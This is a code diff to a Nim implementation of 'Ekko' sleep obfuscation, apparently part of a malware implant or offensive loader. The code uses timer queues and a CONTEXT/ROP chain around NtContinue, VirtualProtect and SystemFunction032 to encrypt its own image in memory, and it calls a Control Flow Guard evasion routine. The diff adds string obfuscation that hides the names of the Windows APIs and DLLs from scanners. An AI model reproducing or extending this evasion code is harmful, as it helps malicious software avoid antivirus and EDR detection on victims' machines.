@@ -5,6 +5,7 @@
 import winim/lean
 import std/random
 import cfg
+import strenc
 
 type
   USTRING* {.bycopy.} = object
@@ -62,8 +63,8 @@ proc ekkoObf*(st: int): VOID =
   var SysFunc032: PVOID = nil
   hEvent = CreateEventW(nil, 0, 0, nil)
   hTimerQueue = CreateTimerQueue()
-  NtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue")
-  SysFunc032 = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032")
+  NtContinue = GetProcAddress(GetModuleHandleA(obf("Ntdll")), obf("NtContinue"))
+  SysFunc032 = GetProcAddress(LoadLibraryA(obf("Advapi32")), obf("SystemFunction032"))
   ImageBase = findBaseAddress(cast[PVOID](findBaseAddress))
   ImageSize = (cast[PIMAGE_NT_HEADERS](cast[uint](ImageBase) +
       cast[uint]((cast[PIMAGE_DOS_HEADER](ImageBase)).e_lfanew))).OptionalHeader.SizeOfImage
@@ -75,7 +76,7 @@ proc ekkoObf*(st: int): VOID =
   Img.MaximumLength = ImageSize
 
   # Add NtContinue as a valid call target for CFG
-  NtContinue = GetProcAddress(GetModuleHandleA("ntdll"), "NtContinue")
+  NtContinue = GetProcAddress(GetModuleHandleA(obf("ntdll")), obf("NtContinue"))
   discard evadeCFG(NtContinue)
 
   if CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](RtlCaptureContext),
@@ -89,7 +90,7 @@ proc ekkoObf*(st: int): VOID =
     copyMem(addr(RopSetEvt), addr(CtxThread), sizeof((CONTEXT)))
     ##  VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
     dec(RopProtRW.Rsp, 8)
-    var VirtualProtectAddr = GetProcAddress(GetModuleHandleA("kernel32"), "VirtualProtect")
+    var VirtualProtectAddr = GetProcAddress(GetModuleHandleA(obf("kernel32")), obf("VirtualProtect"))
     RopProtRW.Rip = cast[DWORD64](VirtualProtectAddr)
     RopProtRW.Rcx = cast[DWORD64](ImageBase)
     RopProtRW.Rdx = cast[DWORD64](ImageSize)
